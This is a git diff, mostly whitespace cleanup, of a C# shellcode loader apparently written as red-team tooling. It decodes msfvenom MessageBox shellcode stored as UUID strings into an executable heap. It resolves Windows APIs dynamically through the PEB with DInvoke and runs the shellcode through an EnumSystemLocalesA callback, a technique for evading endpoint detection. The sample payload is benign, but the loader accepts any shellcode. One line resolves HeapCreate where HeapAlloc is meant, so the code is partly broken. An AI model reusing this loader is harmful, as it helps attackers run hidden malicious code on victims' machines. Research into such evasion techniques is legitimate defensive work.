@@ -61,8 +61,8 @@ namespace USELibrary
             };
             */
 
-            
-            // MessageBox PoC - msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="hello world" -f csharp 
+
+            // MessageBox PoC - msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="hello world" -f csharp
             string[] uuids =
             {
                 "e48148fc-fff0-ffff-e8d0-000000415141",
@@ -85,20 +85,20 @@ namespace USELibrary
                 "726f7720-646c-4d00-6573-73616765426f",
                 "00000078-0000-0000-0000-000000000000"
             };
-            
 
 
-            // Get pointer to DLLs from PEB 
+
+            // Get pointer to DLLs from PEB
             IntPtr pkernel32 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
             IntPtr prpcrt4 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("rpcrt4.dll");
 
-            // Function pointers for winapi calls 
+            // Function pointers for winapi calls
             IntPtr pHeapCreate = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "HeapCreate");
             IntPtr pHeapAlloc = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "HeapCreate");
             IntPtr pEnumSystemLocalesA = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "EnumSystemLocalesA");
             IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, "UuidFromStringA");
 
-            // 1. Heap Create + Alloc 
+            // 1. Heap Create + Alloc
             object[] heapCreateParam = { (uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero };
             var heapHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapCreate, typeof(DELEGATE.HeapCreate), ref heapCreateParam);
 
@@ -106,7 +106,7 @@ namespace USELibrary
             var heapAddr = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapAlloc, typeof(DELEGATE.HeapAlloc), ref heapAllocParam);
             //Console.WriteLine("[>] Allocated Heap address - 0x{0}", heapAddr.ToString("x2"));
 
-            // 2. Writing shellcode from UUID to binary to the heap 
+            // 2. Writing shellcode from UUID to binary to the heap
             IntPtr newHeapAddr = IntPtr.Zero;
             for (int i = 0; i < uuids.Length; i++)
             {
@@ -116,11 +116,11 @@ namespace USELibrary
 
             }
 
-            // 3. Executing shellcode as a callback function 
+            // 3. Executing shellcode as a callback function
             object[] enumSystemLocalesAParam = { heapAddr, 0 };
             var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);
 
-            // Use this if #3 gies access violation error 
+            // Use this if #3 gies access violation error
             //var enumSystemLocalesA = Marshal.GetDelegateForFunctionPointer(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA)) as DELEGATE.EnumSystemLocalesA;
             //enumSystemLocalesA(heapAddr, 0);
         }
